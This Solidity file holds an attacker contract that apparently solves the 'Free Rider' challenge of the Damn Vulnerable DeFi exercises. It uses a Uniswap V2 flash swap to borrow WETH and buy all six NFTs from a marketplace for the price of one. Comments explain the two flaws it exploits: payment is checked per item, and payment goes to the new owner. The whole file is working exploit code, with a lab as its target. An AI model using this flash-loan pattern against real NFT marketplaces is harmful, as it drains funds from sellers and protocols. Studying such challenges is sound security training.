// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using Address for address;

    address payable immutable wEth;
    address immutable dvt;
    address immutable factory;
    address payable immutable buyerMarketplace;
    address immutable buyer;
    address immutable nft;

    receive() external payable {}

    constructor(
        address payable _wEth,
        address _dvt,
        address _factory,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    ) {
        wEth = _wEth;
        dvt = _dvt;
        factory = _factory;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
    }

    function flashSwap(address _tokenBorrow, uint256 _amount) external {
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "not pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        //To call the callback from uniswap you need to pass the data
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    //Flash swap callback from uniswap
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        require(msg.sender == pair, "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 currentBalance = IERC20(tokenBorrow).balanceOf(address(this));
        //widthdraw wEth -> eth
        tokenBorrow.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", currentBalance)
        );

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        //We need to send only 15 eth to buy all nft
        //There is 2 exploits in the function _buy:
        //1. You can buy all nft sending the value of one nft
        //2. You will receive your money back after sending the value because first the function set the owner of the nft and them transfer
        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
            tokenIds
        );
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        (bool sucess, ) = wEth.call{value: 15.1 ether}("");
        require(sucess, "failed to deposit eth");

        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
